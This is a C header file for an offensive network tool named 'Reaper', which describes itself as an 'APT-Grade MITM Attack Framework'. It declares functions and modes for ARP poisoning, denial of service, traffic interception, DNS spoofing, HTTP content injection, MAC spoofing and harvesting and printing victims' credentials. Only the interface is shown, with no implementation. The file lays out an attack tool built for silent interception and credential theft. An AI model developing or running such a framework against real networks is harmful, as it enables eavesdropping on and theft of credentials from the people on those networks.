/*
 * ═══════════════════════════════════════════════════════════════════════════
 *  REAPER MODULE HEADER - SILENT INTERCEPTION ENGINE
 *  APT-Grade MITM Attack Framework
 * ═══════════════════════════════════════════════════════════════════════════
 */

#ifndef REAPER_H
#define REAPER_H

#include "reaper_core.h"

/* ═══════════════════════════════════════════════════════════════════════════
 *  ATTACK MODES
 *  - REAPER_MODE_DOS        : ARP poison only (disconnect target)
 *  - REAPER_MODE_INTERCEPT  : Full MITM with packet capture
 *  - REAPER_MODE_DNS_SPOOF  : DNS response injection
 *  - REAPER_MODE_HTTP_INJECT: HTTP content injection
 *  - REAPER_MODE_HARVEST    : Credential harvesting
 *  - REAPER_MODE_FULL       : All modes active
 * ═══════════════════════════════════════════════════════════════════════════ */

/* ═══════════════════════════════════════════════════════════════════════════
 *  HIGH-LEVEL API (called from shell)
 * ═══════════════════════════════════════════════════════════════════════════ */

// Legacy poison function (DoS + Harvest)
void reaper_poison(const char* target_ip, const char* gateway_ip);

// Full MITM intercept with mode selection
int reaper_intercept(const char* target_ip, const char* gateway_ip, reaper_mode_t mode);

// Stop attack and restore ARP tables
void reaper_stop(void);

// Check if running
int reaper_is_running(void);

// Show status and statistics
void reaper_status(void);

/* ═══════════════════════════════════════════════════════════════════════════
 *  MAC SPOOFING
 * ═══════════════════════════════════════════════════════════════════════════ */

// Spoof MAC address (NULL or "random" for random MAC)
int reaper_spoof_mac(const char* mac_str);

// Restore original MAC
int reaper_restore_mac(void);

/* ═══════════════════════════════════════════════════════════════════════════
 *  DNS SPOOFING
 * ═══════════════════════════════════════════════════════════════════════════ */

// Add DNS spoof rule (domain can use * for wildcard)
void reaper_dns_add(const char* domain, const char* fake_ip);

/* ═══════════════════════════════════════════════════════════════════════════
 *  CREDENTIAL VIEWING
 * ═══════════════════════════════════════════════════════════════════════════ */

// Print harvested credentials
void reaper_print_credentials(reaper_session_t* session);

#endif // REAPER_H
